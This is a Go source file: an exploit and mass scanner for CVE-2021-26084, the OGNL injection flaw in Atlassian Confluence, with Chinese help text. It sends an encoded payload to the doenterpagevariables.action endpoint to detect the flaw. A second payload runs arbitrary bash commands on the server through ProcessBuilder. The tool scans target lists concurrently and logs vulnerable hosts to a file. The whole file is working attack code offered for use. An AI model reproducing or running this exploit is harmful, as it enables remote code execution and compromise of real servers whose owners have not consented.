package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var (
	path     = "/pages/doenterpagevariables.action"
	poc_flag = "aaa{class java.lang.String=null}bbb"
	exp_flag = "kkk{Process"
	i_url    string //url
	i_file   string //file
	i_cmd    string //cmd
	banner   = `
                      ___   ___ ___  __      ___   __   ___   ___  _  _   
                     |__ \ / _ \__ \/_ |    |__ \ / /  / _ \ / _ \| || |  
   _____   _____ ______ ) | | | | ) || |______ ) / /_ | | | | (_) | || |_ 
  / __\ \ / / _ \______/ /| | | |/ / | |______/ / '_ \| | | |> _ <|__   _|
 | (__ \ V /  __/     / /_| |_| / /_ | |     / /| (_) | |_| | (_) |  | |  
  \___| \_/ \___|    |____|\___/____||_|    |____\___/ \___/ \___/   |_|  
                                                                          
                    by:i11us0ry@OverSpace  T00ls.Net
help:
批量检测：go run CVE-2021-26084.go -f fofascan1630478074.txt
单个检测：go run CVE-2021-26084.go -u http://xxx:8090 -c whoami
`
)

func post(url, data string) string {
	resp, err := http.Post(url,
		"application/x-www-form-urlencoded",
		strings.NewReader(data))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return string(body)
}

func poc(url string) bool {
	poc_body := "queryString=aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D%7D%2B%5Cu0027bbb"
	url = url + path
	resp := post(url, string(poc_body))
	if resp != "" {
		if find := strings.Contains(resp, poc_flag); find {
			return true
		}
	}
	return false
}

func exp(url, command string) bool {
	exp_body := "queryString=kkk%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022javax.script.ScriptEngineManager%5Cu0022%29.newInstance%28%29.getEngineByName%28%5Cu0022js%5Cu0022%29.eval%28%5Cu0022var+x%3Dnew+java.lang.ProcessBuilder%3Bx.command%28%5B%5Cu0027%2Fbin%2Fbash%5Cu0027%2C%5Cu0027-c%5Cu0027%2C%5Cu0027" + command + "%5Cu0027%5D%29%3Bx.start%28%29%5Cu0022%29%7D%2B%5Cu0027"
	url = url + path
	resp := post(url, string(exp_body))
	if resp != "" {
		if find := strings.Contains(resp, exp_flag); find {
			return true
		}
	}
	return false
}

func fileWrite(file, data string) {
	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
	if err != nil {
		fmt.Printf("%v\n", err)
		return
	}
	if _, err = io.WriteString(f, data); err != nil {
		fmt.Printf("%v\n", err)
		return
	}
	defer f.Close()
}

func fileRead(file string) *bufio.Scanner {
	f, err := os.OpenFile(file, os.O_RDONLY, 0)
	if err != nil {
		return nil
	}
	datas := bufio.NewScanner(f)
	return datas
}

func work(input, result chan string) {
	for {
		url, ok := <-input
		if !ok {
			return
		}
		if flag := poc(url); flag {
			result <- fmt.Sprintf("%-50s 存在cve-2021-26084漏洞", url)
		} else {
			result <- ""
		}
	}
}

func init() {
	flag.StringVar(&i_file, "f", "", "要批量扫描的文件")
	flag.StringVar(&i_url, "u", "", "要单个检测的url")
	flag.StringVar(&i_cmd, "c", "whoami", "要执行的命令")
	flag.Parse()
}

func main() {
	fmt.Println(banner)
	if i_file != "" {
		list := []string{}
		data := fileRead(i_file)
		for data.Scan() {
			list = append(list, data.Text())
		}
		input := make(chan string, len(list))
		defer close(input)
		result := make(chan string, len(list))
		for _, v := range list {
			input <- v
		}
		for i := 0; i < 20; i++ {
			go work(input, result)
		}
		i := 0
		for scanResult := range result {
			i++
			if scanResult != "" {
				fmt.Println(scanResult)
				fileWrite("result.txt", scanResult+"\n")
			}
			if i == cap(result) {
				close(result)
				break
			}
		}
	} else {
		if flag := exp(i_url, "whoami"); flag {
			scanResult := fmt.Sprintf("%-50s 存在cve-2021-26084漏洞，且可执行命令", i_url)
			fmt.Println(scanResult)
			fileWrite("result.txt", scanResult)
		}
	}
}
